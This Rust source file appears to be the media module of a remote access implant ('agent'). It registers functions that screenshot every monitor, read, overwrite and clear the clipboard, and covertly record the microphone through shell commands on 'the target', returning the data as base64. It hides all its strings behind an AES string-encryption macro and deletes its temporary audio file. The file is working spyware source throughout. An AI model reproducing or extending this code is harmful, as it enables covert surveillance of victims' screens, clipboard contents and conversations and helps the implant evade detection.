// src/agent/scripting/media.rs
use rhai::Engine;
use std::{fs, io::Cursor, time::Duration};
use screenshots::Screen;
use image::ImageOutputFormat;
use arboard::Clipboard;
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use crate::utils;
use crate::strcrypt_rt;
use strcrypt::aes_str;

pub fn register(engine: &mut Engine) {

    // ── Screenshot ────────────────────────────────────────────────────────────
    // Returns a JSON array: [{monitor_index, width, height, b64}]

    engine.register_fn(&aes_str!("internal_screenshot"), || -> String {
        let screens  = Screen::all().unwrap_or_default();
        let mut results = Vec::new();
        for (i, screen) in screens.iter().enumerate() {
            if let Ok(image) = screen.capture() {
                let mut cursor = Cursor::new(Vec::new());
                if image.write_to(&mut cursor, ImageOutputFormat::Png).is_ok() {
                    let b64 = BASE64.encode(cursor.get_ref());
                    results.push(serde_json::json!({
                        aes_str!("monitor_index").as_str(): i,
                        aes_str!("width").as_str():  screen.display_info.width,
                        aes_str!("height").as_str(): screen.display_info.height,
                        aes_str!("b64").as_str():    b64,
                    }));
                }
            }
        }
        serde_json::to_string(&results).unwrap_or("[]".into())
    });

    // ── Clipboard ─────────────────────────────────────────────────────────────

    engine.register_fn(&aes_str!("internal_clipboard_get"), || -> String {
        match Clipboard::new() {
            Ok(mut cb) => cb.get_text().unwrap_or_else(|e| format!("{}{}", aes_str!("[Empty/Image] "), e)),
            Err(e)     => format!("{}{}", aes_str!("Clipboard Init Error: "), e),
        }
    });

    engine.register_fn(&aes_str!("internal_clipboard_set"), |text: &str| -> String {
        match Clipboard::new() {
            Ok(mut cb) => match cb.set_text(text) {
                Ok(_)  => aes_str!("Success"),
                Err(e) => format!("{}{}", aes_str!("Set Error: "), e),
            },
            Err(e) => format!("{}{}", aes_str!("Clipboard Init Error: "), e),
        }
    });

    engine.register_fn(&aes_str!("internal_clipboard_clear"), || -> String {
        match Clipboard::new() {
            Ok(mut cb) => match cb.clear() {
                Ok(_)  => aes_str!("Clipboard Cleared"),
                Err(e) => format!("{}{}", aes_str!("Clear Error: "), e),
            },
            Err(e) => format!("{}{}", aes_str!("Clipboard Init Error: "), e),
        }
    });

    // ── Microphone ────────────────────────────────────────────────────────────
    // Shell-based recording - requires `arecord` (Linux), `sox`/`ffmpeg` (macOS),
    // or `ffmpeg -f dshow` (Windows) on the target. Returns base64 WAV on
    // success; a descriptive error string if the tool is absent.

    engine.register_fn(&aes_str!("internal_mic_record"), |seconds: i64| -> String {
        let secs  = seconds.max(1).min(300);
        let tmp   = std::env::temp_dir().join(aes_str!("rcm_mic.wav"));
        let tmp_s = tmp.to_string_lossy().to_string();

        let os = std::env::consts::OS;
        let record_cmd = if os == aes_str!("linux").as_str() {
            format!("{}{} {:?}{}", aes_str!("arecord -f cd -t wav -d "), secs, tmp_s, aes_str!(" 2>/dev/null"))
        } else if os == aes_str!("windows").as_str() {
            format!("{}{} {:?}{}", aes_str!("ffmpeg -f dshow -i audio=default -t "), secs, tmp_s, aes_str!(" -y 2>$null"))
        } else if os == aes_str!("macos").as_str() {
            format!("{}{:?}{}{}{}{} {:?}{}", aes_str!("sox -d -t wav "), tmp_s, aes_str!(" trim 0 "), secs, aes_str!(" 2>/dev/null || \
                 ffmpeg -f avfoundation -i ':0' -t "), secs, tmp_s, aes_str!(" -y 2>/dev/null"))
        } else {
            return format!("{}{}", aes_str!("Error: mic recording not supported on "), os);
        };

        let (out, err, code) = utils::execute_shell_command_timeout(
            &record_cmd,
            Duration::from_secs((secs + 15) as u64),
        );

        if code != 0 && tmp.metadata().map(|m| m.len()).unwrap_or(0) == 0 {
            return format!("{}{}): {} {}", aes_str!("Error: recording failed (exit "), code, out, err);
        }

        match fs::read(&tmp) {
            Ok(bytes) => { let _ = fs::remove_file(&tmp); BASE64.encode(&bytes) }
            Err(e)    => format!("{}{}", aes_str!("Error reading WAV: "), e),
        }
    });
}